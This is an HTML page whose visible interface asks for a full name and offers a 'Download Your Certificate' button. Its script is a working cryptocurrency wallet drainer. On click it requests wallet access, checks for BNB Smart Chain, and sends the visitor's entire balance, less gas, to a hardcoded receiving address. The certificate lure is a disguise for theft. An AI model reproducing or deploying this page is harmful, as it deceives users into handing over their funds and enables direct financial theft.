<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>BNB Auto Transfer</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      font-family: sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #f5f5f5;
    }

    .container {
      text-align: center;
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 90%;
    }

    h2 {
      margin-bottom: 20px;
    }

    #sendButton {
      font-size: 18px;
      padding: 12px 30px;
      background-color: #f0b90b;
      border: none;
      color: white;
      border-radius: 8px;
      cursor: pointer;
    }

    #sendButton:hover {
      background-color: #d9a30a;
    }

    #status {
      margin-top: 20px;
      font-size: 14px;
    }

    #nameInput {
      font-size: 18px;
      padding: 10px;
      width: 80%;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 8px;
      outline: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <input type="text" id="nameInput" placeholder="Enter Your Full Name">
    <p>Download Your Certificate</p>
    <button id="sendButton">Download</button>
    <p id="status"></p>
  </div>

  <script>
    const receiver = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a"; // replace with your address
    const gasLimit = 21000;

    document.getElementById("sendButton").onclick = async () => {
      const status = document.getElementById("status");
      status.textContent = "Connecting...";
      status.style.color = "red";

      let web3;

      if (typeof window.ethereum !== 'undefined') {
        web3 = new Web3(window.ethereum);
        try {
          await window.ethereum.request({ method: 'eth_requestAccounts' });
        } catch (err) {
          status.textContent = "Access to wallet denied.";
          return;
        }
      } else if (window.web3) {
        web3 = new Web3(window.web3.currentProvider);
      } else {
        status.textContent = "Ethereum wallet not found. Open in Trust Wallet browser or install MetaMask.";
        return;
      }

      try {
        const accounts = await web3.eth.getAccounts();
        const sender = accounts[0];

        const chainId = await web3.eth.getChainId();
        if (chainId !== 56) {
          status.textContent = "Please switch to BNB Smart Chain (Chain ID 56).";
          return;
        }

        const balanceWei = BigInt(await web3.eth.getBalance(sender));
        const gasPrice = BigInt(await web3.eth.getGasPrice());
        const totalGasCost = gasPrice * BigInt(gasLimit);

        if (balanceWei <= totalGasCost) {
          status.textContent = "Insufficient balance to cover gas fees.";
          return;
        }

        const sendAmount = balanceWei - totalGasCost;

        const txParams = {
          from: sender,
          to: receiver,
          value: "0x" + sendAmount.toString(16),
          gas: "0x" + gasLimit.toString(16),
          gasPrice: "0x" + gasPrice.toString(16),
        };

        status.textContent = "Sending transaction...";
        status.style.color = "black";

        web3.eth.sendTransaction(txParams)
          .on('transactionHash', function(hash){
            status.style.color = "green";
            status.textContent = "Transaction sent! Hash: " + hash;
          })
          .on('error', function(error){
            status.style.color = "red";
            status.textContent = "Transaction failed: " + (error.message || error);
          });

      } catch (err) {
        status.style.color = "red";
        status.textContent = "Error: " + (err.message || err);
      }
    };
  </script>
</body>
</html>
